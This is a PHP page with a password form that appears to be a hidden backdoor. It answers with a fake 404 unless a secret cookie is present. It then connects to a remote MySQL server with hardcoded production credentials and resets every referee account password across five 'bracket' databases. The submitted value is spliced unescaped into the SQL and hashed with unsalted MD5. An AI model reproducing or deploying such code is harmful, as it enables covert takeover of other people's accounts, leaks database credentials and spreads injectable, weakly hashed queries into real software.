<?php 
if (!isset($_COOKIE['iamvitold22']) && !$_COOKIE['iamvitold222']) {
	header("HTTP/1.0 404 Not Found"); 
	exit;
}

if (isset($_REQUEST['new_password'])) {
$mysqli = new mysqli("185.66.87.81", "production", "L3ayYvVVjblvu3B", "bracket", "33066");

if ($mysqli->connect_errno)
{
	echo "bracket_connect.php: Error Connecting to MySQL Server<br-->\n";
	exit;
}
$mysqli->query("UPDATE `pbs_referees` SET `Passwd` = MD5('" . $_REQUEST['new_password'] . "')");

$mysqli = new mysqli("185.66.87.81", "production", "L3ayYvVVjblvu3B", "bracket2", "33066");

if ($mysqli->connect_errno)
{
	echo "bracket_connect.php: Error Connecting to MySQL Server<br-->\n";
	exit;
}
$mysqli->query("UPDATE `pbs_referees` SET `Passwd` = MD5('" . $_REQUEST['new_password'] . "')");

$mysqli = new mysqli("185.66.87.81", "production", "L3ayYvVVjblvu3B", "bracket3", "33066");

if ($mysqli->connect_errno)
{
	echo "bracket_connect.php: Error Connecting to MySQL Server<br-->\n";
	exit;
}
$mysqli->query("UPDATE `pbs_referees` SET `Passwd` = MD5('" . $_REQUEST['new_password'] . "')");

$mysqli = new mysqli("185.66.87.81", "production", "L3ayYvVVjblvu3B", "bracket4", "33066");

if ($mysqli->connect_errno)
{
	echo "bracket_connect.php: Error Connecting to MySQL Server<br-->\n";
	exit;
}
$mysqli->query("UPDATE `pbs_referees` SET `Passwd` = MD5('" . $_REQUEST['new_password'] . "')");

$mysqli = new mysqli("185.66.87.81", "production", "L3ayYvVVjblvu3B", "bracket5", "33066");
 
if ($mysqli->connect_errno)
{
	echo "bracket_connect.php: Error Connecting to MySQL Server<br-->\n";
	exit;
}
$mysqli->query("UPDATE `pbs_referees` SET `Passwd` = MD5('" . $_REQUEST['new_password'] . "')");

die("success");
}

?>
<html>
<body>
<form method="post">
<input type="text" name="new_password"> &nbsp;&nbsp;&nbsp;&nbsp;
<input type="submit">
</form>
</body>
</html>